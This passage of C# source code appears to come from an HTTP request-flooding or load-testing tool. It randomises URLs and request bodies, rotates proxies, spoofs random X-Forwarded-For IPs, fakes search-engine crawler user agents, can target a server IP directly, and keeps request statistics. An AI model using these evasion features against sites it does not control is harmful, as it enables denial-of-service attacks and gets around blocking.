                {
                    //字符串最小长度到最大长度
                    int min = int.Parse(strArr[0]);

                    int max = int.Parse(strArr[1]);

                    int num = new Random().Next(min, max);

                    randomString = GetRandomString(num);
                }

                requestUrl = requestUrl.Replace($"[String,{text}]", randomString);
            }

            //替换网址为IP
            if (!string.IsNullOrEmpty(config.ServerIp))
            {
                //替换域名为IP地址
                Uri uri = new Uri(requestUrl.Replace("[Post]", ""));

                requestUrl = requestUrl.Replace(uri.Host, config.ServerIp);
            }

            return requestUrl;
        }

        /// <summary>
        /// 设置请求头
        /// </summary>
        /// <param name="proxy"></param>
        public Dictionary<string, string> GetRequestHeader()
        {
            Dictionary<string, string> headers = new Dictionary<string, string>();

            //随机IP
            string randomIp = IpHelper.getRandomIp();

            foreach (var item in config.HttpRequestHeaders)
            {
                string value = item.Value;

                //处理[RandomIp]请求头
                while (value.Contains("[RandomIp]"))
                {
                    value = value.Replace("[RandomIp]", randomIp);
                }

                //处理[Number]请求头
                while (value.Contains("[Number,"))
                {
                    string text = value.Substring("[Number,", "]");

                    string[] strArr = text.Split(new char[] { ',' });

                    string number = string.Empty;

                    if (strArr.Length == 1)
                    {
                        //数字长度[Number, 10]
                        number = GetRandomString(int.Parse(strArr[0]), true, false, false);
                    }
                    else
                    {
                        //[Number,10,30] 数字最小值,数字最大值

                        int min = int.Parse(strArr[0]);

                        int max = int.Parse(strArr[1]);

                        int num = new Random().Next(min, max);

                        number = num.ToString();
                    }

                    value = value.Replace($"[Number,{text}]", number);
                }

                //处理[String]请求头
                while (value.Contains("[String,"))
                {
                    string text = value.Substring("[String,", "]");

                    string[] strArr = text.Split(new char[] { ',' });

                    string randomString = string.Empty;

                    if (strArr.Length == 1)
                    {
                        //字符串长度
                        randomString = GetRandomString(int.Parse(strArr[0]));
                    }
                    else
                    {
                        //字符串最小长度到最大长度
                        int min = int.Parse(strArr[0]);

                        int max = int.Parse(strArr[1]);

                        int num = new Random().Next(min, max);

                        randomString = GetRandomString(num);
                    }

                    value = value.Replace($"[String,{text}]", randomString);
                }

                headers.Add(item.Key, value);
            }

            //如果设置了服务器IP地址 需要添加Host请求头
            if (!string.IsNullOrEmpty(config.ServerIp))
            {
                bool addHost = false;

                Uri uri = new Uri(config.HttpUrlList[0].Replace("[Post]", ""));

                if (!string.IsNullOrEmpty(config.ServerIp))
                {
                    foreach (var item in headers)
                    {
                        if (item.Key.ToLower() == "host")
                        {
                            if (item.Value.ToLower() == uri.Host.ToLower())
                            {
                                addHost = true;

                                break;
                            }
                        }
                    }
                }

                if (!addHost)
                {
                    //更新或添加Host请求头
                    headers.Add("Host", uri.Host);
                }
            }

            //伪装代理IP
            if (config.RandomIp)
            {
                headers.Add("X-Forwarded-For", randomIp);
            }

            //如果未手动设置User-Agent
            string userAgent = string.Empty;

            bool hasUserAgent = false;

            foreach (var item in headers)
            {
                if (item.Key.ToLower() == "user-agent")
                {
                    hasUserAgent = true;

                    break;
                }
            }

            if (!hasUserAgent)
            {
                //勾选了随机搜索引擎
                if (config.RandomSpiderUserAgent)
                {
                    userAgent = SpiderUserAgentList[new Random().Next(0, SpiderUserAgentList.Count)];
                }
                //勾选了随机
                else if (config.RandomUserAgent)
                {
                    userAgent = UserAgentList[new Random().Next(0, UserAgentList.Count)];
                }
            }

            if (!string.IsNullOrEmpty(userAgent))
            {
                headers.Add("User-Agent", userAgent);
            }

            return headers;
        }

        /// <summary>
        /// 获取请求数据内容
        /// </summary>
        /// <returns></returns>
        public string GetRequestContent()
        {
            string requestContent = config.HttpRequestContent;

            //替换随机数字
            while ((!string.IsNullOrEmpty(requestContent)) && requestContent.Contains("[Number,"))
            {
                string text = requestContent.Substring("[Number,", "]");

                string[] strArr = text.Split(new char[] { ',' });

                string number = string.Empty;

                if (strArr.Length == 1)
                {
                    //数字长度[Number, 10]
                    number = GetRandomString(int.Parse(strArr[0]), true, false, false);
                }
                else
                {
                    //[Number,10,30] 数字最小值,数字最大值

                    int min = int.Parse(strArr[0]);

                    int max = int.Parse(strArr[1]);

                    int num = new Random().Next(min, max);

                    number = num.ToString();
                }

                requestContent = requestContent.Replace($"[Number,{text}]", number);
            }

            //替换随机字符串
            while ((!string.IsNullOrEmpty(requestContent)) && requestContent.Contains("[String,"))
            {
                string text = requestContent.Substring("[String,", "]");

                string[] strArr = text.Split(new char[] { ',' });

                string randomString = string.Empty;

                if (strArr.Length == 1)
                {
                    //字符串长度
                    randomString = GetRandomString(int.Parse(strArr[0]));
                }
                else
                {
                    //字符串最小长度到最大长度
                    int min = int.Parse(strArr[0]);

                    int max = int.Parse(strArr[1]);

                    int num = new Random().Next(min, max);

                    randomString = GetRandomString(num);
                }

                requestContent = requestContent.Replace($"[String,{text}]", randomString);
            }

            return requestContent;
        }

        /// <summary>
        ///获取HttpWebRequest
        /// </summary>
        /// <param name="httpWebRequest"></param>
        /// <param name="proxy"></param>
        public HttpWebRequest GetRequest(string url, Dictionary<string, string> headers, string proxy)
        {
            //Url判断是否Post
            string httpMethod = "Get";

            if (url.StartsWith("[Post]"))
            {
                httpMethod = "Post";

                url = url.Replace("[Post]", "");
            }

            HttpWebRequest httpWebRequest = WebRequest.CreateHttp(url);

            //请求方法
            httpWebRequest.Method = httpMethod;

            httpWebRequest.CookieContainer = ProxyCookieDic[proxy];

            //请求头
            foreach (var item in headers)
            {
                switch (item.Key.ToLower())
                {
                    case "accept":
                        httpWebRequest.Accept = item.Value;
                        break;

                    case "accept-encoding":
                        if (item.Value.ToLower().Contains("gzip") || item.Value.ToLower().Contains("deflate"))
                        {
                            httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                        }
                        break;

                    case "connection":
                        if (item.Value.ToLower() == "close")
                        {
                            httpWebRequest.KeepAlive = false;
                        }
                        else
                        {
                            httpWebRequest.KeepAlive = true;
                        }
                        break;

                    case "content-length":
                        httpWebRequest.ContentLength = long.Parse(item.Value);
                        break;

                    case "content-type":
                        httpWebRequest.ContentType = item.Value;
                        break;

                    case "date":
                        httpWebRequest.Date = DateTime.Parse(item.Value);
                        break;

                    case "expect":
                        if (item.Value.ToLower() == "100-continue")
                        {
                            httpWebRequest.ServicePoint.Expect100Continue = true;
                        }
                        break;

                    case "host":
                        httpWebRequest.Host = item.Value;
                        break;

                    case "if-modified-since"://DateTime.Now.ToString("r")
                        httpWebRequest.IfModifiedSince = DateTime.Parse(item.Value);
                        break;

                    case "referer":
                        httpWebRequest.Referer = item.Value;
                        break;

                    case "user-agent":
                        httpWebRequest.UserAgent = item.Value;
                        break;

                    case "range":
                        string specifier;
                        int from;
                        int to;
                        ParseRange(item.Value, out specifier, out from, out to);
                        if (from < to)
                        {
                            httpWebRequest.AddRange(specifier, from, to);
                        }
                        break;

                    case "transfer-encoding":
                        httpWebRequest.TransferEncoding = item.Value;
                        break;

                    default:
                        httpWebRequest.Headers.Add(item.Key, item.Value);
                        break;
                }
            }

            //Post方法 设置Content-Type
            if (httpWebRequest.Method.ToLower() == "post")
            {
                if (string.IsNullOrEmpty(httpWebRequest.ContentType))
                {
                    httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                }
            }
            else
            {
                if (!string.IsNullOrEmpty(httpWebRequest.ContentType))
                {
                    httpWebRequest.ContentType = null;
                }
            }

            //其它设置
            if (config.HttpAutomaticDecompression)
            {
                httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
            }

            if (config.KeepAlive)
            {
                httpWebRequest.KeepAlive = config.KeepAlive;
            }

            if (config.Pipelined)
            {
                httpWebRequest.Pipelined = config.Pipelined;
            }

            if (config.HttpTimeout > 0)
            {
                httpWebRequest.Timeout = (int)(config.HttpTimeout * 1000);

                httpWebRequest.ReadWriteTimeout = (int)(config.HttpTimeout * 1000);
            }

            //代理
            if (proxy != LocalProxy)
            {
                httpWebRequest.Proxy = new WebProxy(proxy);
            }

            return httpWebRequest;
        }

        public string HttpGetPost(string url, string postData, string proxy)
        {
            Log.Debug($"开始Http请求:{url}");

            string text = string.Empty;

            HttpWebResponse httpWebResponse = null;

            Stream responseStream = null;

            try
            {
                //获取请求头
                Dictionary<string, string> headers = GetRequestHeader();

                //获取请求
                HttpWebRequest httpWebRequest = GetRequest(url, headers, proxy);

                if (!string.IsNullOrEmpty(postData))
                {
                    //写入数据内容
                    string content = GetRequestContent();

                    byte[] bytes = Encoding.UTF8.GetBytes(content);

                    Stream requestStream = httpWebRequest.GetRequestStream();

                    requestStream.Write(bytes, 0, bytes.Length);

                    requestStream.Close();
                }
                else
                {
                    //移除Post请求才有的请求头
                    string XRequestedWith = "X-Requested-With";

                    string[] keys = httpWebRequest.Headers.AllKeys;

                    foreach (var item in keys)
                    {
                        if (item.ToLower() == XRequestedWith.ToLower())
                        {
                            httpWebRequest.Headers.Remove(item);

                            break;
                        }
                    }
                }

                httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();

                responseStream = httpWebResponse.GetResponseStream();

                MemoryStream memoryStream = new MemoryStream();

                responseStream.CopyTo(memoryStream);

                byte[] buffer = memoryStream.ToArray();

                memoryStream.Close();

                text = Encoding.UTF8.GetString(buffer);
            }
            catch
            {

            }
            finally
            {
                if (responseStream != null)
                {
                    responseStream.Close();
                }

                if (httpWebResponse != null)
                {
                    httpWebResponse.Close();
                }
            }

            return text;
        }

        public byte[] HttpGet(string url, string proxy)
        {
            Log.Debug($"开始Http Get 请求:{url}");

            byte[] buffer = null;

            HttpWebResponse httpWebResponse = null;

            Stream responseStream = null;

            try
            {
                //获取请求头
                Dictionary<string, string> headers = GetRequestHeader();

                //获取请求
                HttpWebRequest httpWebRequest = GetRequest(url, headers, proxy);

                //移除Post请求才有的请求头
                string XRequestedWith = "X-Requested-With";

                string[] keys = httpWebRequest.Headers.AllKeys;

                foreach (var item in keys)
                {
                    if (item.ToLower() == XRequestedWith.ToLower())
                    {
                        httpWebRequest.Headers.Remove(item);

                        break;
                    }
                }

                httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();

                responseStream = httpWebResponse.GetResponseStream();

                MemoryStream memoryStream = new MemoryStream();

                responseStream.CopyTo(memoryStream);

                buffer = memoryStream.ToArray();

                memoryStream.Close();
            }
            catch
            {

            }
            finally
            {
                if (responseStream != null)
                {
                    responseStream.Close();
                }

                if (httpWebResponse != null)
                {
                    httpWebResponse.Close();
                }
            }

            return buffer;
        }

        /// <summary>
        /// Parses the range header string
        /// </summary>
        /// <param name="rangeHeaderValue">Value of range header</param>
        /// <param name="rangeSpecifier">bytes for example</param>
        /// <param name="from">from value</param>
        /// <param name="to">to value</param>
        public static void ParseRange(string rangeHeaderValue, out string rangeSpecifier, out int from, out int to)
        {
            rangeSpecifier = "bytes";

            from = 0;

            to = 0;

            int indexOfEqual = rangeHeaderValue.IndexOf('=');

            if (indexOfEqual > -1)
            {
                rangeSpecifier = rangeHeaderValue.Substring(0, indexOfEqual).Trim();

                //fremove the range specifier from the header value

                rangeHeaderValue = rangeHeaderValue.Substring(indexOfEqual + 1).Trim();
            }

            int indexOfDash = rangeHeaderValue.IndexOf('-');

            if (indexOfDash > -1)
            {
                string fromValue = rangeHeaderValue.Substring(0, indexOfDash).Trim();

                if (!string.IsNullOrWhiteSpace(fromValue))
                {
                    int.TryParse(fromValue, out from);
                }

                rangeHeaderValue = rangeHeaderValue.Substring(indexOfDash + 1).Trim();
            }

            //lastly try parsing the remaining string into the to value

            if (!string.IsNullOrWhiteSpace(rangeHeaderValue))
            {
                int.TryParse(rangeHeaderValue, out to);
            }
        }

        private void timer_Tick(object sender, EventArgs e)
        {
            ShowStatisticInfo();

            var runTime = DateTime.Now - RunDateTime;

            //更新程序运行时间
            this.Text = $"{Title} {Ver} 运行时间:{runTime.ToString("hh\\:mm\\:ss")}";
        }

        private void btnClearStatisticInfo_Click(object sender, EventArgs e)
        {
            ClearStatisticInfo();
        }

        public void ClearStatisticInfo()
        {
            Log.Info($"清空统计信息");

            statisticInfo.TotalRequest = 0;

            statisticInfo.SuccessRequest = 0;

            statisticInfo.FailRequest = 0;

            statisticInfo.RequestBytes = 0;
        }
    }
}
